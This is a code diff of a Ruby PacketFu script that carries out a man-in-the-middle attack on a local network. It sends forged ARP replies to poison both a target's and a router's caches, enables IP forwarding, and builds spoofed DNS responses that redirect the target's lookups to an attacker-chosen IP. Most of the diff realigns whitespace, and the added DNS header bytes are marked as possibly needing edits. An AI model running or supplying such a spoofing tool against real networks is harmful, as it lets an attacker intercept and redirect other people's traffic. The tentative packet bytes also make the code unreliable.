@@ -80,19 +80,31 @@ def send_dns_response(orig_pkt, name)
   dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
   dns_resp.eth_saddr = @sender_mac
   dns_resp.eth_daddr = @target_mac
-  dns_resp.udp_dst = orig_pkt.udp_src
-  dns_resp.udp_src = orig_pkt.udp_dst
-  dns_resp.ip_saddr = orig_pkt.ip_daddr
-  dns_resp.ip_daddr = @target_ip
+  dns_resp.udp_dst   = orig_pkt.udp_src
+  dns_resp.udp_src   = orig_pkt.udp_dst
+  dns_resp.ip_saddr  = orig_pkt.ip_daddr
+  dns_resp.ip_daddr  = @target_ip
 
   #DNS header
   #copy transaction ID from original query to response
+=begin
+  transID1 = orig_pkt.payload[0].unpack('H*')[0]
+  transID2 = orig_pkt.payload[1].unpack('H*')[0]
+  transID = transID1.hex.chr + transID2.hex.chr
+  dns_resp.payload = transID
+=end
   dns_resp.payload = orig_pkt.payload[0,2]
-  #response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+  dns_resp.payload += "\x85\x80" + "\x00\x01\x00\x02" + "\x04\x00\x00\x04" #may need to edit this
 
   #Domain Name
+  name.split('.').each do |part|
+    dns_resp.payload += part.length.chr
+    dns_resp.payload += part
+  end
 
-  #Rest of DNS Header (defaults)
+  #Rest of DNS Header (defaults from notes)
+  dns_resp.payload += "\x00\x00\x01"+"\x00\x01"+"\xc0\x0c\x00\x05"+"\x00\x01\x00\x02\xa3\x00\x04" #may need to edit this
+
 
   #Spoofed IP
   ip_ary = @sender_ip.split('.')
@@ -116,23 +128,23 @@ end
 
 # Construct the target's packet
 arp_packet_target = PacketFu::ARPPacket.new()
-arp_packet_target.eth_saddr = @sender_mac       # sender's MAC address
-arp_packet_target.eth_daddr = @target_mac       # target's MAC address
-arp_packet_target.arp_saddr_mac = @sender_mac   # sender's MAC address
-arp_packet_target.arp_daddr_mac = @target_mac   # target's MAC address
-arp_packet_target.arp_saddr_ip = @router_ip     # router's IP
-arp_packet_target.arp_daddr_ip = @target_ip     # target's IP
-arp_packet_target.arp_opcode = 2                # arp code 2 == ARP reply
+arp_packet_target.eth_saddr     = @sender_mac       # sender's MAC address
+arp_packet_target.eth_daddr     = @target_mac       # target's MAC address
+arp_packet_target.arp_saddr_mac = @sender_mac       # sender's MAC address
+arp_packet_target.arp_daddr_mac = @target_mac       # target's MAC address
+arp_packet_target.arp_saddr_ip  = @router_ip        # router's IP
+arp_packet_target.arp_daddr_ip  = @target_ip        # target's IP
+arp_packet_target.arp_opcode    = 2                 # arp code 2 == ARP reply
  
 # Construct the router's packet
 arp_packet_router = PacketFu::ARPPacket.new()
-arp_packet_router.eth_saddr = @sender_mac       # sender's MAC address
-arp_packet_router.eth_daddr = @router_mac       # router's MAC address
-arp_packet_router.arp_saddr_mac = @sender_mac   # sender's MAC address
-arp_packet_router.arp_daddr_mac = @router_mac   # router's MAC address
-arp_packet_router.arp_saddr_ip = @target_ip     # target's IP
-arp_packet_router.arp_daddr_ip = @router_ip     # router's IP
-arp_packet_router.arp_opcode = 2                # arp code 2 == ARP reply
+arp_packet_router.eth_saddr     = @sender_mac       # sender's MAC address
+arp_packet_router.eth_daddr     = @router_mac       # router's MAC address
+arp_packet_router.arp_saddr_mac = @sender_mac       # sender's MAC address
+arp_packet_router.arp_daddr_mac = @router_mac       # router's MAC address
+arp_packet_router.arp_saddr_ip  = @target_ip        # target's IP
+arp_packet_router.arp_daddr_ip  = @router_ip        # router's IP
+arp_packet_router.arp_opcode    = 2                 # arp code 2 == ARP reply
 
 # Enable IP forwarding
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
